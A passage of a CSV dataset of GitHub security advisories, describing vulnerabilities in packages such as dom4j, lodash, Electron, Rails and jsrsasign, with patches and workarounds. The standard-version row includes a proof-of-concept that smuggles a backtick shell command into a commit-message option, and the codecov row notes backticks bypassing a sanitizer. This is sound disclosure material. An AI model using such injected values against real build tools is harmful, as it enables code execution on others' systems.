    const user = Parse.User.current()
    if (user) {
        user.setPassword('newpass')
        await user.save()
    }
}
```
After running the above code, the new password will be stored in localStorage as a property named ""password"".

Proposed Solution:
Before saving anything to localStorage, Parse should strip out any properties named ""password"" that are attempting to be stored with a Parse.User type object.

Configuration:
Parse SDK: 2.9.1
Parse Server: 3.9.0",npm
748,34196,org.dom4j:dom4j,GHSA-6pcc-3rfx-4gpm,CVE-2018-1000632,https://github.com/advisories/GHSA-6pcc-3rfx-4gpm,high,2018-10-16 17:01:25 UTC,Dom4j contains a XML Injection vulnerability,"dom4j version prior to version 2.1.1 contains a CWE-91: XML Injection vulnerability in Class: Element. Methods: addElement, addAttribute that can result in an attacker tampering with XML documents through XML injection. This attack appear to be exploitable via an attacker specifying attributes or elements in the XML document. This vulnerability appears to have been fixed in 2.1.1 or later.

Note: This advisory applies to `dom4j:dom4j` version 1.x legacy artifacts.  To resolve this a change to the latest version of `org.dom4j:dom4j` is recommended.",maven
749,34196,org.dom4j:dom4j,GHSA-hwj3-m3p6-hj38,CVE-2020-10683,https://github.com/advisories/GHSA-hwj3-m3p6-hj38,critical,2020-06-05 16:13:36 UTC,dom4j allows External Entities by default which might enable XXE attacks,"dom4j before 2.1.3 allows external DTDs and External Entities by default, which might enable XXE attacks. However, there is popular external documentation from OWASP showing how to enable the safe, non-default behavior in any application that uses dom4j.

Note: This advisory applies to `dom4j:dom4j` version 1.x legacy artifacts.  To resolve this a change to the latest version of `org.dom4j:dom4j` is recommended.",maven
750,20088,wagtail,GHSA-2473-9hgq-j7xw,CVE-2020-15118,https://github.com/advisories/GHSA-2473-9hgq-j7xw,moderate,2020-07-20 17:50:30 UTC,Cross-Site Scripting in Wagtail,"### Impact
When a form page type is made available to Wagtail editors through the `wagtail.contrib.forms` app, and the page template is built using Django's standard form rendering helpers such as `form.as_p` ([as directed in the documentation](https://docs.wagtail.io/en/stable/reference/contrib/forms/index.html#usage)), any HTML tags used within a form field's help text will be rendered unescaped in the page. Allowing HTML within help text is [an intentional design decision](https://docs.djangoproject.com/en/3.0/ref/models/fields/#django.db.models.Field.help_text) by Django; however, as a matter of policy Wagtail does not allow editors to insert arbitrary HTML by default, as this could potentially be used to carry out cross-site scripting attacks, including privilege escalation. This functionality should therefore not have been made available to editor-level users.

The vulnerability is not exploitable by an ordinary site visitor without access to the Wagtail admin.

### Patches
Patched versions have been released as Wagtail 2.7.4 (for the LTS 2.7 branch) and Wagtail 2.9.3 (for the current 2.9 branch). In these versions, help text will be escaped to prevent the inclusion of HTML tags. Site owners who wish to re-enable the use of HTML within help text (and are willing to accept the risk of this being exploited by editors) may set `WAGTAILFORMS_HELP_TEXT_ALLOW_HTML = True` in their configuration settings.

### Workarounds
Site owners who are unable to upgrade to the new versions can secure their form page templates by [rendering forms field-by-field as per Django's documentation](https://docs.djangoproject.com/en/3.0/topics/forms/#looping-over-the-form-s-fields), but omitting the `|safe` filter when outputting the help text.

### Acknowledgements
Many thanks to Timothy Bautista for reporting this issue.

### For more information
If you have any questions or comments about this advisory:
* Visit Wagtail's [support channels](https://docs.wagtail.io/en/stable/support.html)
* Email us at [security@wagtail.io](mailto:security@wagtail.io) (if you wish to send encrypted email, the public key ID is `0x6ba1e1a86e0f8ce8`)",pip
751,15968,codecov,GHSA-xp63-6vf5-xf3v,CVE-2020-15123,https://github.com/advisories/GHSA-xp63-6vf5-xf3v,moderate,2020-07-20 17:20:20 UTC,Command injection in codecov (npm package),"### Impact

The `upload` method has a command injection vulnerability. Clients of the `codecov-node` library are unlikely to be aware of this, so they might unwittingly write code that contains a vulnerability.

A similar CVE was issued: [CVE-2020-7597](https://github.com/advisories/GHSA-5q88-cjfq-g2mh), but the fix was incomplete. It only blocked `&`, and command injection is still possible using backticks instead to bypass the sanitizer.

We have written a [CodeQL](https://codeql.com) query, which automatically detects this vulnerability. You can see the results of the query on the `codecov-node` project [here](https://lgtm.com/query/7714424068617023832/).


### Patches
This has been patched in version 3.7.1

### Workarounds

None, however, the attack surface is low in this case. Particularly in the standard use of codecov, where the module is used directly in a build pipeline, not built against as a library in another application that may supply malicious input and perform command injection. 

### References
*  [CVE-2020-7597](https://github.com/advisories/GHSA-5q88-cjfq-g2mh)

### For more information
If you have any questions or comments about this advisory:
* Contact us via our [Security Email](mailto:security@codecov.io)",npm
752,18808,lodash,GHSA-p6mc-m468-83gw,CVE-2020-8203,https://github.com/advisories/GHSA-p6mc-m468-83gw,high,2020-07-15 19:15:48 UTC,Prototype Pollution in lodash,"Versions of lodash prior to 4.17.19 are vulnerable to Prototype Pollution. The function zipObjectDeep allows a malicious user to modify the prototype of Object if the property identifiers are user-supplied. Being affected by this issue requires zipping objects based on user-provided property arrays.

This vulnerability causes the addition or modification of an existing property that will exist on all objects and may lead to Denial of Service or Code Execution under specific circumstances.",npm
753,16053,standard-version,GHSA-7xcx-6wjh-7xp2,,https://github.com/advisories/GHSA-7xcx-6wjh-7xp2,moderate,2020-07-13 21:34:59 UTC,Command Injection in standard-version,"# GitHub Security Lab (GHSL) Vulnerability Report: `GHSL-2020-111`

The [GitHub Security Lab](https://securitylab.github.com) team has identified a potential security vulnerability in [standard-version](https://github.com/conventional-changelog/standard-version).

## Summary

The `standardVersion` function has a command injection vulnerability. Clients of the `standard-version` library are unlikely to be aware of this, so they might unwittingly write code that contains a vulnerability.

## Product
Standard Version
 
## Tested Version
Commit [2f04ac8](https://github.com/conventional-changelog/standard-version/tree/2f04ac8fc1c134a1981c23a093d4eece77d0bbb9/)

## Details

### Issue 1: Command injection in `standardVersion`

The following proof-of-concept illustrates the vulnerability. First install Standard Version and create an empty git repo to run the PoC in:

```
npm install standard-version
git init
echo ""foo"" > foo.txt # the git repo has to be non-empty
git add foo.txt
git commit -am ""initial commit""
```

Now create a file with the following contents:

```
var fs = require(""fs"");
// setting up a bit of environment
fs.writeFileSync(""package.json"", '{""name"": ""foo"", ""version"": ""1.0.0""}');

const standardVersion = require('standard-version')

standardVersion({
  noVerify: true,
  infile: 'foo.txt',
  releaseCommitMessageFormat: ""bla `touch exploit`""
})
```

and run it:

```
node test.js
```

Notice that a file named `exploit` has been created.

This vulnerability is similar to command injection vulnerabilities that have been found in other Javascript libraries. Here are some examples:
[CVE-2020-7646](https://github.com/advisories/GHSA-m8xj-5v73-3hh8),
[CVE-2020-7614](https://github.com/advisories/GHSA-426h-24vj-qwxf),
[CVE-2020-7597](https://github.com/advisories/GHSA-5q88-cjfq-g2mh),
[CVE-2019-10778](https://github.com/advisories/GHSA-4gp3-p7ph-x2jr),
[CVE-2019-10776](https://github.com/advisories/GHSA-84cm-v6jp-gjmr),
[CVE-2018-16462](https://github.com/advisories/GHSA-9jm3-5835-537m),
[CVE-2018-16461](https://github.com/advisories/GHSA-7g2w-6r25-2j7p),
[CVE-2018-16460](https://github.com/advisories/GHSA-cfhg-9x44-78h2),
[CVE-2018-13797](https://github.com/advisories/GHSA-pp57-mqmh-44h7),
[CVE-2018-3786](https://github.com/advisories/GHSA-c9j3-wqph-5xx9),
[CVE-2018-3772](https://github.com/advisories/GHSA-wjr4-2jgw-hmv8),
[CVE-2018-3746](https://github.com/advisories/GHSA-3pxp-6963-46r9),
[CVE-2017-16100](https://github.com/advisories/GHSA-jcw8-r9xm-32c6),
[CVE-2017-16042](https://github.com/advisories/GHSA-qh2h-chj9-jffq).

We have written a [CodeQL](https://codeql.com) query, which automatically detects this vulnerability. You can see the results of the query on the `standard-version` project [here](https://lgtm.com/query/237522640229151035/).

#### Impact

This issue may lead to remote code execution if a client of the library calls the vulnerable method with untrusted input.

#### Remediation

We recommend not using an API that can interpret a string as a shell command. For example, use [`child_process.execFile`](https://nodejs.org/api/child_process.html#child_process_child_process_execfile_file_args_options_callback) instead of [`child_process.exec`](https://nodejs.org/api/child_process.html#child_process_child_process_exec_command_options_callback).

## Credit

This issue was discovered and reported by GitHub Engineer [@erik-krogh (Erik Krogh Kristensen)](https://github.com/erik-krogh).

## Contact

You can contact the GHSL team at `securitylab@github.com`, please include `GHSL-2020-111` in any communication regarding this issue.

## Disclosure Policy

This report is subject to our [coordinated disclosure policy](https://securitylab.github.com/disclosures#policy).",npm
754,16105,npm,GHSA-93f3-23rq-pjfp,CVE-2020-15095,https://github.com/advisories/GHSA-93f3-23rq-pjfp,moderate,2020-07-07 18:56:16 UTC,npm CLI exposing sensitive information through logs,Versions of the npm CLI prior to 6.14.6 are vulnerable to an information exposure vulnerability through log files. The CLI supports URLs like `<protocol>://[<user>[:<password>]@]<hostname>[:<port>][:][/]<path>`. The password value is not redacted and is printed to stdout and also to any generated log files.,npm
755,19060,actionview,GHSA-xq5j-gw7f-jgj8,CVE-2020-8167,https://github.com/advisories/GHSA-xq5j-gw7f-jgj8,moderate,2020-07-07 16:34:10 UTC,CSRF Vulnerability in rails-ujs,"There is an vulnerability in rails-ujs that allows attackers to send
CSRF tokens to wrong domains.

Versions Affected:  rails <= 6.0.3
Not affected:       Applications which don't use rails-ujs.
Fixed Versions:     rails >= 5.2.4.3, rails >= 6.0.3.1

Impact
------

This is a regression of CVE-2015-1840.

In the scenario where an attacker might be able to control the href attribute of an anchor tag or
the action attribute of a form tag that will trigger a POST action, the attacker can set the
href or action to a cross-origin URL, and the CSRF token will be sent.

Workarounds
-----------

To work around this problem, change code that allows users to control the href attribute of an anchor
tag or the action attribute of a form tag to filter the user parameters.

For example, code like this:

    link_to params

to code like this:

    link_to filtered_params

    def filtered_params
      # Filter just the parameters that you trust
    end",rubygems
756,19060,actionview,GHSA-cr3x-7m39-c6jq,CVE-2020-8163,https://github.com/advisories/GHSA-cr3x-7m39-c6jq,high,2020-07-07 16:34:27 UTC,Potential remote code execution of user-provided local names in ActionView,The is a code injection vulnerability in versions of Rails prior to 5.0.1 that wouldallow an attacker who controlled the `locals` argument of a `render` call to perform a RCE.,rubygems
757,16343,electron,GHSA-m93v-9qjc-3g79,CVE-2020-4076,https://github.com/advisories/GHSA-m93v-9qjc-3g79,high,2020-07-07 00:01:07 UTC,Context isolation bypass via leaked cross-context objects in Electron,"### Impact
Apps using `contextIsolation` are affected.

This is a context isolation bypass, meaning that code running in the main world context in the renderer can reach into the isolated Electron context and perform privileged actions.

### Workarounds
There are no app-side workarounds, you must update your Electron version to be protected.

### Fixed Versions
* `9.0.0-beta.21`
* `8.2.4`
* `7.2.4`

### Non-Impacted Versions
* `9.0.0-beta.*`

### For more information
If you have any questions or comments about this advisory:
* Email us at [security@electronjs.org](mailto:security@electronjs.org)",npm
758,16343,electron,GHSA-h9jc-284h-533g,CVE-2020-4077,https://github.com/advisories/GHSA-h9jc-284h-533g,high,2020-07-07 00:01:10 UTC,Context isolation bypass via contextBridge in Electron,"### Impact
Apps using both `contextIsolation` and `contextBridge` are affected.

This is a context isolation bypass, meaning that code running in the main world context in the renderer can reach into the isolated Electron context and perform privileged actions.

### Workarounds
There are no app-side workarounds, you must update your Electron version to be protected.

### Fixed Versions
* `9.0.0-beta.21`
* `8.2.4`
* `7.2.4`

### For more information
If you have any questions or comments about this advisory:
* Email us at [security@electronjs.org](mailto:security@electronjs.org)",npm
759,16343,electron,GHSA-f9mq-jph6-9mhm,CVE-2020-4075,https://github.com/advisories/GHSA-f9mq-jph6-9mhm,moderate,2020-07-07 00:01:13 UTC,Arbitrary file read via window-open IPC in Electron,"### Impact
The vulnerability allows arbitrary local file read by defining unsafe window options on a child window opened via window.open.

### Workarounds
Ensure you are calling `event.preventDefault()` on all [`new-window`](https://electronjs.org/docs/api/web-contents#event-new-window) events where the `url` or `options` is not something you expect.

### Fixed Versions
* `9.0.0-beta.21`
* `8.2.4`
* `7.2.4`

### For more information
If you have any questions or comments about this advisory:
* Email us at [security@electronjs.org](mailto:security@electronjs.org)",npm
760,16343,electron,GHSA-6vrv-94jv-crrg,CVE-2020-15096,https://github.com/advisories/GHSA-6vrv-94jv-crrg,low,2020-07-07 00:01:05 UTC,Context isolation bypass via Promise in Electron,"### Impact
Apps using `contextIsolation` are affected.

This is a context isolation bypass, meaning that code running in the main world context in the renderer can reach into the isolated Electron context and perform privileged actions.

### Workarounds
There are no app-side workarounds, you must update your Electron version to be protected.

### Fixed Versions
* `9.0.0-beta.21`
* `8.2.4`
* `7.2.4`
* `6.1.11`

### For more information
If you have any questions or comments about this advisory:
* Email us at [security@electronjs.org](mailto:security@electronjs.org)",npm
761,18839,rack,GHSA-5f9h-9pjv-v6j7,CVE-2020-8161,https://github.com/advisories/GHSA-5f9h-9pjv-v6j7,high,2020-07-06 21:31:02 UTC,Directory traversal in Rack::Directory app bundled with Rack,A directory traversal vulnerability exists in rack < 2.2.0 that allows an attacker perform directory traversal vulnerability in the Rack::Directory app that is bundled with Rack which could result in information disclosure.,rubygems
762,18422,kind-of,GHSA-6c8f-qphg-qjgp,CVE-2019-20149,https://github.com/advisories/GHSA-6c8f-qphg-qjgp,high,2020-03-31 15:59:54 UTC,Validation Bypass in kind-of,"Versions of `kind-of` 6.x prior to 6.0.3 are vulnerable to a Validation Bypass. A maliciously crafted object can alter the result of the type check, allowing attackers to bypass the type checking validation. 


## Recommendation

Upgrade to versions 6.0.3 or later.",npm
763,34040,org.quartz-scheduler:quartz,GHSA-9qcf-c26r-x5rf,CVE-2019-13990,https://github.com/advisories/GHSA-9qcf-c26r-x5rf,critical,2020-07-01 17:55:03 UTC,XML external entity injection in Terracotta Quartz Scheduler,initDocumentParser in xml/XMLSchedulingDataProcessor.java in Terracotta Quartz Scheduler through 2.3.0 allows XXE attacks via a job description.,maven
764,39022,org.apache.logging.log4j:log4j,GHSA-fxph-q3j8-mv87,CVE-2017-5645,https://github.com/advisories/GHSA-fxph-q3j8-mv87,critical,2020-01-06 18:43:38 UTC,Deserialization of Untrusted Data in Log4j,"In Apache Log4j 2.x before 2.8.2, when using the TCP socket server or UDP socket server to receive serialized log events from another application, a specially crafted binary payload can be sent that, when deserialized, can execute arbitrary code.",maven
765,39022,org.apache.logging.log4j:log4j,GHSA-vwqq-5vrc-xw9h,CVE-2020-9488,https://github.com/advisories/GHSA-vwqq-5vrc-xw9h,low,2020-06-05 14:15:51 UTC,Improper validation of certificate with host mismatch in Apache Log4j SMTP appender,Improper validation of certificate with host mismatch in Apache Log4j SMTP appender prior to version 2.13.2. This could allow an SMTPS connection to be intercepted by a man-in-the-middle attack which could leak any log messages sent through that appender.,maven
766,33924,mysql:mysql-connector-java,GHSA-jcq3-cprp-m333,CVE-2019-2692,https://github.com/advisories/GHSA-jcq3-cprp-m333,moderate,2020-07-01 17:12:20 UTC,Privilege escalation in mysql-connector-jav,"Vulnerability in the MySQL Connectors component of Oracle MySQL (subcomponent: Connector/J). Supported versions that are affected are 8.0.15 and prior. Difficult to exploit vulnerability allows high privileged attacker with logon to the infrastructure where MySQL Connectors executes to compromise MySQL Connectors. Successful attacks require human interaction from a person other than the attacker. Successful attacks of this vulnerability can result in takeover of MySQL Connectors. CVSS 3.0 Base Score 6.3 (Confidentiality, Integrity and Availability impacts). CVSS Vector: (CVSS:3.0/AV:L/AC:H/PR:H/UI:R/S:U/C:H/I:H/A:H).",maven
767,34016,com.thoughtworks.xstream:xstream,GHSA-rgh3-987h-wpmw,CVE-2016-3674,https://github.com/advisories/GHSA-rgh3-987h-wpmw,high,2020-06-30 22:48:14 UTC,XML External Entity Injection in XStream,"Multiple XML external entity (XXE) vulnerabilities in the (1) Dom4JDriver, (2) DomDriver, (3) JDomDriver, (4) JDom2Driver, (5) SjsxpDriver, (6) StandardStaxDriver, and (7) WstxDriver drivers in XStream before 1.4.9 allow remote attackers to read arbitrary files via a crafted XML document.",maven
768,34016,com.thoughtworks.xstream:xstream,GHSA-7hwc-46rm-65jh,CVE-2017-7957,https://github.com/advisories/GHSA-7hwc-46rm-65jh,high,2020-06-30 22:48:24 UTC,Denial of service in XStream,"XStream through 1.4.9, when a certain denyTypes workaround is not used, mishandles attempts to create an instance of the primitive type 'void' during unmarshalling, leading to a remote application crash, as demonstrated by an xstream.fromXML(""<void/>"") call.",maven
769,34137,io.netty:netty-handler,GHSA-xfv3-rrfm-f2rv,CVE-2015-2156,https://github.com/advisories/GHSA-xfv3-rrfm-f2rv,high,2020-06-30 21:01:21 UTC,Information Exposure in Netty,"Netty before 3.9.8.Final, 3.10.x before 3.10.3.Final, 4.0.x before 4.0.28.Final, and 4.1.x before 4.1.0.Beta5 and Play Framework 2.x before 2.3.9 might allow remote attackers to bypass the httpOnly flag on cookies and obtain sensitive information by leveraging improper validation of cookie name and value characters.",maven
770,34137,io.netty:netty-handler,GHSA-9959-6p3m-wxpc,CVE-2014-3488,https://github.com/advisories/GHSA-9959-6p3m-wxpc,moderate,2020-06-30 21:01:31 UTC,Denial of service in Netty,The SslHandler in Netty before 3.9.2 allows remote attackers to cause a denial of service (infinite loop and CPU consumption) via a crafted SSLv2Hello message.,maven
771,33879,com.fasterxml.jackson.core:jackson-databind,GHSA-w3f4-3q6j-rh82,CVE-2018-5968,https://github.com/advisories/GHSA-w3f4-3q6j-rh82,high,2020-06-30 20:40:50 UTC,Deserialization of Untrusted Data in jackson-databind,FasterXML jackson-databind through 2.8.11 and 2.9.x through 2.9.3 allows unauthenticated remote code execution because of an incomplete fix for the CVE-2017-7525 and CVE-2017-17485 deserialization flaws. This is exploitable via two different gadgets that bypass a blacklist.,maven
772,17884,express-jwt,GHSA-6g6m-m6h5-w9gf,CVE-2020-15084,https://github.com/advisories/GHSA-6g6m-m6h5-w9gf,high,2020-06-30 16:05:24 UTC,Authorization bypass in express-jwt,"### Overview
Versions before and including 5.3.3, we are not enforcing the **algorithms** entry to be specified in the configuration.
When **algorithms** is not specified in the configuration, with the combination of jwks-rsa, it may lead to authorization bypass. 

### Am I affected?
You are affected by this vulnerability if all of the following conditions apply:

You are using express-jwt
AND 
You do not have **algorithms**  configured in your express-jwt configuration.
AND
You are using libraries such as jwks-rsa as the **secret**. 

### How to fix that?
Specify **algorithms** in the express-jwt configuration. The following is an example of a proper configuration

``` 
const checkJwt = jwt({
  secret: jwksRsa.expressJwtSecret({
    rateLimit: true,
    jwksRequestsPerMinute: 5,
    jwksUri: `https://${DOMAIN}/.well-known/jwks.json`
  }),
  // Validate the audience and the issuer.
  audience: process.env.AUDIENCE,
  issuer: `https://${DOMAIN}/`,
  // restrict allowed algorithms
  algorithms: ['RS256']
}); 
```

### Will this update impact my users?
The fix provided in patch will not affect your users if you specified the algorithms allowed. The patch now makes **algorithms** a required configuration. 


### Credit
IST Group",npm
773,18778,jsrsasign,GHSA-g753-jx37-7xwh,,https://github.com/advisories/GHSA-g753-jx37-7xwh,moderate,2020-06-30 16:05:08 UTC,ECDSA signature vulnerability of Minerva timing attack in jsrsasign,"### Impact
ECDSA side-channel attack named [Minerava](https://minerva.crocs.fi.muni.cz/) have been found and it was found that it affects to jsrsasign.

Execution time of thousands signature generation have been observed then EC private key which is scalar value may be recovered since point and scalar multiplication time depends on bits of scalar. In jsrsasign 8.0.13 or later, execution time of EC point and scalar multiplication is almost constant and fixed for the issue.

- Minerva is one of timing attack or side channel attack for EC.
- If you don't use ECDSA class, you are not affected the vulnerability.
- The vulnerability is that attacker may guess private key by checking processing time of EC key generation or ECDSA signing.
- The cause issue is that point multiplication processing time in ECDSA signing is depends on private key value.
- After 8.0.13, processing time of point multiplication in ECDSA signing have become constant for key value in theory.

### Patches
Users using ECDSA signature generation should upgrade to 8.0.13 or later.

### Workarounds
There is no workarounds in jsrsasign. Update jsrsasign or use other ECDSA library.

### ACKNOWLEDGEMENT
Thanks to Jan Jancar @J08nY, Petr Svenda and Vladimir Sedlacek of Masaryk University in Czech Republic to find and report this vulnerability.

### References
https://minerva.crocs.fi.muni.cz/
https://www.npmjs.com/advisories/1505
https://github.com/kjur/jsrsasign/issues/411",npm
774,18778,jsrsasign,GHSA-p8c3-7rj8-q963,CVE-2020-14966,https://github.com/advisories/GHSA-p8c3-7rj8-q963,high,2020-06-26 16:54:15 UTC,ECDSA signature validation vulnerability by accepting wrong ASN.1 encoding in jsrsasign,"### Impact
Jsrsasign supports ECDSA signature validation which signature value is represented by ASN.1 DER encoding. This vulnerablity may accept a wrong ASN.1 DER encoded ECDSA signature such as:

- wrong multi-byte ASN.1 length of TLV (ex. 0x820045 even though 0x45 is correct)
- prepending zeros with ASN.1 INTEGER value (ex. 0x00000123 even though 0x0123 is correct)
- appending zeros to signature of ASN.1 TLV (ex. 0x3082....1fbc000000 even though 0x3082....1fbc, appending zeros are ignored.)

This vulnerability was fixed by strict ASN.1 DER checking. 

Here is an assessment of this vulnerability:

- If you are not use ECDSA signature validation, this vulnerability is not affected.
- Not ASN.1 format signature like just concatenation of R and S value is not affected such as Bitcoin.
- This vulnerability is affected to all ECC curve parameters.
- Risk to accept a forged or crafted message to be signed is low.
- Risk to raise memory corruption is low since jsrsasign uses BigInteger class.
- ECDSA signatures semantically the same to valid one may be accepted as valid. There are many malleable variants.

As discussed [here](https://crypto.stackexchange.com/questions/24862/ber-or-der-x9-62-for-ecdsa-signature), there is no standards like X9.62 which requires ASN.1 DER. So ASN.1 BER can be applied to ECDSA however most of implementations like OpenSSL do strict ASN.1 DER checking.

### Patches
Users using ECDSA signature validation should upgrade to 8.0.19.

### Workarounds
Do strict ASN.1 DER checking for ASN.1 encoded ECDSA signature value.

### References
https://nvd.nist.gov/vuln/detail/CVE-2020-14966
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-14966
https://vuldb.com/?id.157123
https://github.com/kjur/jsrsasign/issues/437
https://kjur.github.io/jsrsasign/api/symbols/KJUR.crypto.ECDSA.html
https://kjur.github.io/jsrsasign/api/symbols/ASN1HEX.html#.checkStrictDER
https://www.itu.int/rec/T-REC-X.690

",npm
775,18778,jsrsasign,GHSA-xxxq-chmp-67g4,CVE-2020-14967,https://github.com/advisories/GHSA-xxxq-chmp-67g4,critical,2020-06-26 16:27:08 UTC,RSA PKCS#1 decryption vulnerability with prepending zeros in jsrsasign,"### Impact
Jsrsasign supports RSA PKCS#1 v1.5 (i.e. RSAES-PKCS1-v1_5) and RSA-OAEP encryption and decryption. Its encrypted message is represented as BigInteger. When there is a valid encrypted message, a crafted message with prepending zeros can be decrypted by this vulnerability.

- If you don't use RSA PKCS1-v1_5 or RSA-OAEP decryption, this vulnerability is not affected.
- Risk to forge contents of encrypted message is very low.
- Risk to raise memory corruption is low since jsrsasign uses BigInteger class.

### Patches
Users using RSA PKCS1-v1_5 or RSA-OAEP decryption should upgrade to 8.0.18.

### Workarounds
Reject RSA PKCS1-v1_5 or RSA-OAEP encrypted message with unnecessary prepending zeros.

### References
https://nvd.nist.gov/vuln/detail/CVE-2020-14967
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-14967
https://vuldb.com/?id.157124
https://kjur.github.io/jsrsasign/api/symbols/KJUR.crypto.Cipher.html#.decrypt
https://github.com/kjur/jsrsasign/issues/439



",npm
776,18778,jsrsasign,GHSA-q3gh-5r98-j4h3,CVE-2020-14968,https://github.com/advisories/GHSA-q3gh-5r98-j4h3,critical,2020-06-26 16:26:50 UTC,RSA-PSS signature validation vulnerability by prepending zeros in jsrsasign,"### Impact
Jsrsasign can verify RSA-PSS signature which value can expressed as BigInteger. When there is a valid RSA-PSS signature value, this vulnerability is also accept value with prepending zeros as a valid signature.

- If you are not use RSA-PSS signature validation, this vulnerability is not affected. 
- Risk to accept a forged or crafted message to be signed is low.
- Risk to raise memory corruption is low since jsrsasign uses BigInteger class.

### Patches
Users using RSA-PSS signature validation should upgrade to 8.0.17.

### Workarounds
Reject RSA-PSS signatures with unnecessary prepending zeros.

### References
https://github.com/kjur/jsrsasign/security/advisories/GHSA-q3gh-5r98-j4h3
[https://github.com/kjur/jsrsasign/issues/438](https://github.com/kjur/jsrsasign/issues/438)
https://nvd.nist.gov/vuln/detail/CVE-2020-14968
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-14968
https://vuldb.com/?id.157125
https://kjur.github.io/jsrsasign/api/symbols/RSAKey.html#.verifyWithMessageHashPSS

",npm
777,18865,actionpack,GHSA-c6qr-h5vq-59jc,CVE-2020-8185,https://github.com/advisories/GHSA-c6qr-h5vq-59jc,moderate,2020-06-24 17:40:33 UTC,Untrusted users can run pending migrations in production in Rails,"There is a vulnerability in versions of Rails prior to 6.0.3.2 that allowed
an untrusted user to run any pending migrations on a Rails app running in
production.

This vulnerability has been assigned the CVE identifier CVE-2020-8185.

Versions Affected:  6.0.0 < rails < 6.0.3.2
Not affected:       Applications with `config.action_dispatch.show_exceptions = false` (this is not a default setting in production)
Fixed Versions:     rails >= 6.0.3.2

Impact
------

Using this issue, an attacker would be able to execute any migrations that
are pending for a Rails app running in production mode. It is important to
note that an attacker is limited to running migrations the application
developer has already defined in their application and ones that have not
already ran.

Workarounds
-----------

Until such time as the patch can be applied, application developers should
disable the ActionDispatch middleware in their production environment via
a line such as this one in their config/environment/production.rb:

`config.middleware.delete ActionDispatch::ActionableExceptions`",rubygems
778,18839,rack,GHSA-j6w9-fv6q-3q52,CVE-2020-8184,https://github.com/advisories/GHSA-j6w9-fv6q-3q52,high,2020-06-24 17:15:00 UTC,Percent-encoded cookies can be used to overwrite existing prefixed cookie names,"A reliance on cookies without validation/integrity check security vulnerability exists in rack < 2.2.3, rack < 2.1.4 that makes it is possible for an attacker to forge a secure or host-only cookie prefix.",rubygems
779,16174,angular,GHSA-mhp6-pxh8-r675,CVE-2020-7676,https://github.com/advisories/GHSA-mhp6-pxh8-r675,moderate,2020-06-18 14:19:58 UTC,Cross site scripting in Angular,"angular.js prior to 1.8.0 allows cross site scripting. The regex-based input HTML replacement may turn sanitized code into unsanitized one. Wrapping ""<option>"" elements in ""<select>"" ones changes parsing behavior, leading to possibly unsanitizing code.",npm
780,33879,com.fasterxml.jackson.core:jackson-databind,GHSA-c2q3-4qrh-fm48,CVE-2020-14061,https://github.com/advisories/GHSA-c2q3-4qrh-fm48,high,2020-06-18 14:44:50 UTC,Deserialization of untrusted data in Jackson Databind,"FasterXML jackson-databind 2.x before 2.9.10.5 mishandles the interaction between serialization gadgets and typing, related to oracle.jms.AQjmsQueueConnectionFactory, oracle.jms.AQjmsXATopicConnectionFactory, oracle.jms.AQjmsTopicConnectionFactory, oracle.jms.AQjmsXAQueueConnectionFactory, and oracle.jms.AQjmsXAConnectionFactory (aka weblogic/oracle-aqjms).",maven
781,33879,com.fasterxml.jackson.core:jackson-databind,GHSA-c265-37vj-cwcc,CVE-2020-14062,https://github.com/advisories/GHSA-c265-37vj-cwcc,high,2020-06-18 14:44:48 UTC,Deserialization of untrusted data in Jackson Databind,"FasterXML jackson-databind 2.x before 2.9.10.5 mishandles the interaction between serialization gadgets and typing, related to com.sun.org.apache.xalan.internal.lib.sql.JNDIConnectionPool (aka xalan2).",maven
782,33879,com.fasterxml.jackson.core:jackson-databind,GHSA-j823-4qch-3rgm,CVE-2020-14060,https://github.com/advisories/GHSA-j823-4qch-3rgm,high,2020-06-18 14:44:46 UTC,Deserialization of untrusted data in Jackson Databind,"FasterXML jackson-databind 2.x before 2.9.10.5 mishandles the interaction between serialization gadgets and typing, related to oadd.org.apache.xalan.lib.sql.JNDIConnectionPool (aka apache/drill).",maven
783,33879,com.fasterxml.jackson.core:jackson-databind,GHSA-mc6h-4qgp-37qh,CVE-2020-14195,https://github.com/advisories/GHSA-mc6h-4qgp-37qh,high,2020-06-18 14:44:43 UTC,Deserialization of untrusted data in Jackson Databind,"FasterXML jackson-databind 2.x before 2.9.10.5 mishandles the interaction between serialization gadgets and typing, related to org.jsecurity.realm.jndi.JndiRealmFactory (aka org.jsecurity).",maven
784,18453,mversion,GHSA-qjg4-w4c6-f6c6,CVE-2020-4059,https://github.com/advisories/GHSA-qjg4-w4c6-f6c6,high,2020-06-18 19:23:17 UTC,Command injection in mversion,"### Impact
This issue may lead to remote code execution if a client of the library calls the vulnerable method with untrusted input.

### Patches
Patched by version 2.0.0. Previous releases are deprecated in npm.

### Workarounds
Make sure to escape git commit messages when using the commitMessage option for the update function.",npm
785,16105,npm,GHSA-m6cx-g6qm-p2cx,CVE-2019-16775,https://github.com/advisories/GHSA-m6cx-g6qm-p2cx,high,2019-12-13 15:39:19 UTC,Arbitrary File Write in npm,"Versions of the npm CLI prior to 6.13.3 are vulnerable to an Arbitrary File Write. It fails to prevent access to folders outside of the intended node_modules folder through the bin field. A properly constructed entry in the package.json bin field would allow a package publisher to create files on a user's system when the package is installed. It is only possible to affect files that the user running `npm install` has access to and it is not possible to over write files that already exist on disk.

This behavior is still possible through install scripts. This vulnerability bypasses a user using the --ignore-scripts install option.


## Recommendation

Upgrade to version 6.13.3 or later.",npm
786,18932,sprockets,GHSA-r4x3-g983-9g48,,https://github.com/advisories/GHSA-r4x3-g983-9g48,moderate,2018-10-10 17:29:34 UTC,Moderate severity vulnerability that affects sprockets,"Withdrawn, accidental duplicate publish.

Multiple directory traversal vulnerabilities in server.rb in Sprockets before 2.0.5, 2.1.x before 2.1.4, 2.2.x before 2.2.3, 2.3.x before 2.3.3, 2.4.x before 2.4.6, 2.5.x before 2.5.1, 2.6.x and 2.7.x before 2.7.1, 2.8.x before 2.8.3, 2.9.x before 2.9.4, 2.10.x before 2.10.2, 2.11.x before 2.11.3, 2.12.x before 2.12.3, and 3.x before 3.0.0.beta.3, as distributed with Ruby on Rails 3.x and 4.x, allow remote attackers to determine the existence of files outside the application root via a ../ (dot dot slash) sequence with (1) double slashes or (2) URL encoding.",rubygems
